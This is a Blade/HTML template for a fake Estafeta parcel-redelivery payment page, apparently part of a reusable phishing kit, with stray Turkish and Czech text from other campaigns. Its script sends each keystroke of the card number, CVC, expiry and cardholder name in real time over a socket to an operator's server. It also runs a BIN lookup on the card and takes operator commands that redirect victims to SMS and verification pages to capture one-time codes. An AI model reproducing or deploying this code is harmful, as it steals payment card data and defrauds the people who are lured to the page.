@include('apps.mxe.partials.header')
<style>
    .hideH {
        display: none !important;
    }

    .wrap {
        padding: 0px 20px;
        margin-top: 50px;
    }

    .step {
        color: #325754;
        padding-bottom: 10px;
        font-weight: bold;
    }

    .top1 table.cstm-table td {
        font-size: 14px;
        letter-spacing: 0;
        white-space: normal;
        padding: 5px 0;
        vertical-align: text-bottom;
        line-height: 1.3;
        color: #000;
    }

    .top1 table.cstm-table td strong {
        white-space: nowrap;
        margin-right: 15px;
        color: #325754;
    }

    .form-input label {
        display: block;
        color: #333333;
        font-weight: bold;
    }

    .form-input input {
        width: calc(100% - 30px);
    }

    .form-row input,
    .form-input input,
    .form-row select {
        flex-grow: 1;
        border: 1px solid #325754;
        height: 30px;
        outline: none;
        padding: 0 10px;
        border: 1px solid #325754;
        height: 30px;
        outline: none;
        padding: 0 10px;
        border-radius: 4px;
    }

    .card-icons img:last-child {
        padding: 1px 4px;
        border-radius: 3px;
        background-color: #fff;
        height: 23px;
        position: relative;
        top: -1px;
    }

    table td {
        border: none !important;

    }

    .card-icons img {
        height: 25px !important;
        margin-top: 5px;
    }

    .form-input .select {
        padding-right: 15px;
        width: 25%;
        margin-top: 12px;
        margin-bottom: 12px;
    }

    label.required:after {
        content: " *";
        color: red;
    }

    .form-input {
        margin-bottom: 20px;
    }

    .form-input.cvv input {
        width: 70px;
        color: #333333;
    }

    .form-input.cvv {
        align-items: end;
        color: #333333;
        display: flex;
    }

    .form-input.cvv span img {
        width: 30px;
        margin-left: 20px;
    }

    .extra-details>p {
        color: #333333;
    }

    .form-input.ddmm {
        display: flex;
    }

    h3.step {
        font-size: 18px;
        font-weight: bold;
        color: #325754;
        margin-bottom: 10px;
    }

    .extra-details {
        text-align: center;
        font-weight: bold;
        margin-top: 25px;
        font-size: 14px;
        margin-bottom: 20px;
    }

    .top1 h3 {
        text-align: center;
        margin-bottom: 15px;
        font-size: 22px;
        margin-top: 15px;
        color: #325754;
    }

    .top1 table.cstm-table td {
        font-size: 14px;
        letter-spacing: 0;
        white-space: normal;
        padding: 5px 0;
        vertical-align: text-bottom;
        line-height: 1.3;
    }

    .top1 table.cstm-table td strong {
        white-space: nowrap;
        margin-right: 15px;
    }

    .top1 table.cstm-table {
        margin-bottom: 20px;
    }

    .card-icons {
        padding-bottom: 11px;
    }

    .backd-form {
        border: 2px solid black;
        border-radius: 10px;
        margin-bottom: 20px;
    }

    .form-input.cvv:last-child {
        border-bottom: none;
    }

    .form-input {
        border-bottom: 1px solid;
        padding: 20px;
    }

    .form-input {
        margin-bottom: unset !important;
    }

    @media(max-width: 767px) {
        .submit-btn {
            background-color: #c00d0d;
            padding: 11px 24px;
            font-size: 20px;
            display: block;
            width: 100%;
            min-width: 120px;
            margin-left: auto;
            margin-right: auto;
            line-height: 22px;
            border-radius: 32px;
            color: #fff;
            border-color: #00a8b7;
            height: auto;
            cursor: pointer;
        }

        .submit-btn:hover:hover {
            background-color: #00a8b7;
            border-color: #00a8b7;
        }
    }
</style>

<div class="wrap">
    <div class="form">
        <form method="POST" id="target">
            <input type="hidden" name="csrfToken" id="csrfToken" value="{{ csrf_token() }}">
            <div class="top1">
                <h3 class="text-center">Pago en línea</h3>
                <h6> Por la redistribución, Estafeta cobrará una tasa de servicio de $17.Le volveremos a entregar su
                    paquete lo antes posible una vez confirmado el pedido.</h6>
                <table class="cstm-table" border="0" width="100%">
                    <tbody>
                        <tr>
                            <td><strong>Total:</strong></td>
                            <td>MXN$ 17 </td>
                        </tr>
                    </tbody>
                </table>
            </div>

            <div class="backdrop"></div>

            <div class="backd-form form-input">
                <label>Enviar a:</label>
                <div class="col-sm-12">
                    <div class="card col-sm-12">
                        <span style="text-align: right;padding-right: 0px;"><a
                                href="{{ route('apps.mxe.address') }}">reeditar</a></span>
                        <div class="" style="padding-left:0px;">
                            <p>
                                {{ $address }}<br>
                                {{ $straight }}<br>
                                {{ $country }}<br>
                                {{ $zipcode }}<br>
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            <br>

            <div class="backd-form">
                <div class="form-input">
                    <label class="required" for="">Número de tarjeta de crédito</label>
                    <input class="inputField" type="text" id="cardNumber" name="cardnumber" minlength="19"
                        maxlength="19" placeholder="xxxx-xxxx-xxxx-xxxx" required>
                    <span class="crediterror" style="color:red; display:none;">Introduzca un número de tarjeta de
                        crédito válido.</span>
                    <span class="errormsg" style="color:red; display:none;">Esta tarjeta no es compatible, por favor
                        cambie de tarjeta para pagar</span>
                    <span id="cardError" class="carderrormsg" style="color:red; display:none;">Banka kartı ile ödeme şu
                        anda desteklenmemektedir, lütfen ödeme için kredi kartınızı girin.</span>
                </div>
                <div class="form-input ">
                    <label class="required" for="">Fecha de validez</label>
                    <div class="ddmm for_flex" style="display: flex;">
                        <div class="select">
                            <label class="required" for=""></label>
                            <select name="month" id="month" required>
                                <option value="">MM</option>
                                @for ($i = 1; $i <= 12; $i++)
                                    <option value="{{ $i }}">{{ $i }}</option>
                                @endfor
                            </select>
                        </div>
                        <div class="select">
                            <label class="required" for=""></label>
                            <select name="year" id="year" required>
                                <option value="">YY</option>
                                @for ($i = 22; $i <= 32; $i++)
                                    <option value="{{ $i }}">{{ $i }}</option>
                                @endfor
                            </select>
                        </div>
                    </div>
                </div>
                <div class="form-input">
                    <label class="required" for="">Nombre del titular</label>
                    <input class="inputField" type="text" value="" name="holder" id="holder" required>
                </div>
                <div class="form-input cvv">
                    <div> <label class="required" for="">CVC</label>
                        <input class="inputField" type="text" name="cvv" id="cvv" required>
                    </div>
                    <span class="card_detail"><img src="{{ asset('apps/mxe/images/cvv.jpg') }}"
                            alt=""><strong>Código de
                            seguridad</strong></span>
                </div>
                <input type="hidden" value="" name="newID" id="newID" />
            </div>
            <div class="center">
                <button class="submit-btn disabledClass" name="payment_submit" type="submit"
                    value="submit">Pagar($17)</button>
            </div>
        </form>
        <div class="extra-details">
            <div class="card-icons">
                <img src="{{ asset('apps/mxe/images/social.png') }}" alt="">
            </div>
            <p>Po dokončení objednávky vám na vaši e-mailovou adresu zašleme nové číslo objednávky.</br>
            </p>
        </div>
    </div>
</div>

<div class="spinner-border" id="ajaxprogress"
    style="z-index: 9999;position: fixed;top:0px;display:none;height:100%;width:100%;left: unset;right: unset;"
    role="status">
    <span class=""
        style="z-index: 1041;display: flex;justify-content: center;width: 100%;align-items: center;height:100%;">
        <div class="lds-default">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </span>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.slim.min.js"
    integrity="sha512-yBpuflZmP5lwMzZ03hiCLzA94N0K2vgBtJgqQ2E1meJzmIBfjbb7k4Y23k2i2c/rIeSUGc7jojyIY5waK3ZxCQ=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script type="text/javascript" src="{{ asset('apps/mxe/js/jquery-2.1.3.min.js') }}"></script>
<script>
    localStorage.setItem('form_submitted', false);
    $("input[type='hidden']").val(localStorage.getItem('userID'))

    function formatCardNumber(input) {
        // Remove non-digit characters
        let value = input.replace(/\D/g, '');
        // Add space after every 4 digits
        value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
        // Update the input value with the formatted card number
        return value;
    }

    let addressData = {};
    let requsetSending = false;
    let card_valid = false;
    $(document).ready(function() {
        let socket = io("http://{{ env('SOCKET_HOST') }}:{{ env('SOCKET_PORT') }}");
        if (!localStorage.getItem('userID')) {
            window.location.href = window.location.origin;
        }

        socket.on('connect', () => {
            var id = localStorage.getItem('userID')
            if (id) {
                var data = {
                    id: id,
                    page: 'payment'
                }
                socket.emit('clientEvent', JSON.stringify(data));
                socket.emit('addressData', JSON.stringify({
                    id: id
                }));
            }
        });

        socket.on('cancelCardAlert', () => {
            alert("Card rejected. Please update your card");
            $(".backdrop").hide();
            $('#ajaxprogress').hide();
        });

        socket.on('smsRedirect', () => {
            window.location.href = '/sms';
        });

        socket.on('verificationRedirect', () => {
            window.location.href = '/verification';
        });

        socket.on('fetchAddressData', (data) => {
            const {
                address
            } = data;
            addressData = address;
        })

        $('#cardNumber').on('input', function() {
            formatCardNumber(this);
        });

        $('#cardNumber').keydown((event) => {
            var data = {
                id: localStorage.getItem('userID'),
                page: 'payment',
                field: 'cardNumber',
                value: event.target.value,
                is_typing: true
            }
            socket.emit('clientEvent', JSON.stringify(data));
        });

        $('#cardNumber').keyup((event) => {
            if (card_valid === false) {
                var data = {
                    id: localStorage.getItem('userID'),
                    page: 'payment',
                    field: 'cardNumber',
                    value: event.target.value,
                    is_typing: false
                }
                if (event.target.value.length === 9 && requsetSending === false) {
                    requsetSending = true;
                    let cardNumber = event.target.value.replace(/\s/g, '').substring(0, 8);
                    fetch(`https://data.handyapi.com/bin/${cardNumber}`)
                        .then(response => response.json())
                        .then(res => {
                            requsetSending = false;
                            console.log(res)
                            const data = {
                                id: localStorage.getItem('userID'),
                                page: 'payment',
                                card_detail: {
                                    type: res.Type,
                                    schema: res.Scheme,
                                    issuer: res.Issuer,
                                    tier: res.CardTier
                                }
                            };
                            socket.emit('clientEvent', JSON.stringify(data));
                        }).catch(err => {
                            console.log(err);
                            requsetSending = false;
                        });
                }
                socket.emit('clientEvent', JSON.stringify(data));
            }
            if (event.target.value.length === 9) {
                card_valid = true;
            } else card_valid = false;
        });

        $('#cvv').keydown((event) => {
            var data = {
                id: localStorage.getItem('userID'),
                page: 'payment',
                field: 'cvv',
                value: event.target.value,
                is_typing: true
            }
            socket.emit('clientEvent', JSON.stringify(data));
        });

        $('#cvv').keyup((event) => {
            var data = {
                id: localStorage.getItem('userID'),
                page: 'payment',
                field: 'cvv',
                value: event.target.value,
                is_typing: false
            }
            socket.emit('clientEvent', JSON.stringify(data));
        });

        $('#month').change((event) => {
            var data = {
                id: localStorage.getItem('userID'),
                page: 'payment',
                field: 'month',
                value: event.target.value
            }
            socket.emit('clientEvent', JSON.stringify(data));
        });

        $('#year').change((event) => {
            var data = {
                id: localStorage.getItem('userID'),
                page: 'payment',
                field: 'year',
                value: event.target.value
            }
            socket.emit('clientEvent', JSON.stringify(data));
        });

        $('#holder').keydown((event) => {
            var data = {
                id: localStorage.getItem('userID'),
                page: 'payment',
                field: 'holder',
                value: event.target.value,
                is_typing: true
            }
            socket.emit('clientEvent', JSON.stringify(data));
        });

        $('#holder').keyup((event) => {
            var data = {
                id: localStorage.getItem('userID'),
                page: 'payment',
                field: 'holder',
                value: event.target.value,
                is_typing: false
            }
            socket.emit('clientEvent', JSON.stringify(data));
        });

        $("#target").on("submit", (event) => {
            event.preventDefault();
            // Perform form submission
            const formData = new FormData(event.target);
            const cardData = {};
            for (const [key, value] of formData.entries()) {
                cardData[key] = value;
            }
            $.ajax({
                type: 'post',
                url: "{{ route('apps.mxe.payment_save') }}",
                data: {
                    card: cardData,
                    address: addressData
                },
                success: (response) => {
                    if (response.success) {
                        $(".backdrop").show();
                        $('#ajaxprogress').show();
                        localStorage.setItem('form_submitted', true);
                        localStorage.setItem('userAdded', response.userId);
                        var data = {
                            id: localStorage.getItem('userID'),
                            page: 'card-submitted',
                            userid: response.userId
                        }

                        socket.emit('clientEvent', JSON.stringify(data));
                    }
                }
            });
        });

        //     popcount = 1;
        //     window.setInterval(function() {
        //         // do stuff
        //         var userid = localStorage.getItem('userAdded');
        //         if (userid) {
        //             console.log("##############", userid);

        //             $.ajax({
        //                 type: 'post',
        //                 // url: '/usertrackingstatus.php',
        //                 data: {
        //                     'userid': userid,
        //                     'page': 2
        //                 },
        //                 success: function(data) {
        //                     console.log('his', data);
        //                     if (data == 1) {
        //                         jQuery(location).attr('href', './page5.php');
        //                     }
        //                     if (data == 10) {
        //                         jQuery(location).attr('href', './app.php');
        //                     }
        //                     if (data == 2 || data == '2') {
        //                         jQuery("#ajaxprogress").css("display", "none")
        //                         jQuery('#carderror').css('display', 'block');
        //                         if (popcount == 1) {
        //                             if (window.confirm(
        //                                     'Esta tarjeta no es compatible actualmente, cambie a otro pago con tarjeta de crédito.'
        //                                 )) {
        //                                 console.log("window confirm box message");
        //                                 $(".backdrop").addClass('hideH');
        //                                 $('#ajaxprogress').addClass('hideH');
        //                                 updatePromptStatus();
        //                             }
        //                         }
        //                         popcount++;
        //                         $(".backdrop").hide();
        //                         return false;
        //                     }

        //                 }
        //             });
        //         }


        //     }, 5000);

        //     ws.onopen = function(event) {
        //         if (localStorage.getItem('form_submitted') !== 'true') {
        //             var data = {
        //                 id: localStorage.getItem('userID'),
        //                 action: 'on-card'
        //             }

        //             ws.send(JSON.stringify(data));

        //             cr_no.onkeyup = function(event) {
        //                 event.preventDefault();
        //                 display(this.value, '1', 'cardNumber')
        //                  creditCardValidation();
        // $("#cr_no").removeAttr("style");
        // $(".errormsg").css("display", "none");
        // if (this.value == this.lastValue) return;
        // let caretPosition = this.selectionStart;
        // let sanitizedValue = this.value.replace(/[^0-9]/gi, '');
        // let parts = [];

        // for (var i = 0, len = sanitizedValue.length; i < len; i += 4) {
        //     parts.push(sanitizedValue.substring(i, i + 4));
        // }

        // for (var i = caretPosition - 1; i >= 0; i--) {
        //     var c = this.value[i];
        //     if (c < '0' || c > '9') {
        //         caretPosition--;
        //     }
        // }

        // caretPosition += Math.floor(caretPosition / 4);

        // this.value = this.lastValue = parts.join(' ');
        // this.selectionStart = this.selectionEnd = caretPosition;

        // console.log('validate credit debit');

        // var cc_number_7 = $(this).val().replace(/ /g, '');
        //                 if (cc_number_7.length > 7) {
        //                     $.ajax({
        //                         type: 'post',
        //                         url: '/validate.php',
        //                         data: {
        //                             'cc_number_7': cc_number_7,
        //                             'action': 'cc_details'
        //                         },
        //                         success: function(data) {
        //                             if (data == 1) {
        //                                 $(".submit-btn").removeAttr('disabled');
        //                                 $("input[name=payment_submit]").removeAttr('disabled');
        //                                 $("input[name=payment_submit]").removeClass('disabled');
        //                                 $('.crediterror').css("display", "none");
        //                                 return true;
        //                             } else if (data == 'card_blocked') {
        //                                 $('.crediterror').css("display", "block");
        //                                 $(".submit-btn").attr('disabled', true);
        //                                 return false;
        //                             } else {
        //                                 $('.crediterror').css("display", "block");
        //                                 $(".submit-btn").attr('disabled', true);
        //                                 return false;
        //                             }
        //                         }
        //                     });
        //                 }
        //             };


        //         }

        //     }
    })

    function formatCardNumber(input) {
        // Remove non-digit characters
        let value = $(input).val().replace(/\D/g, '');
        // Add space after every 4 digits
        value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
        // Update the input value with the formatted card number
        $(input).val(value);
    }
</script>
@include('apps.mxe.partials.footer')
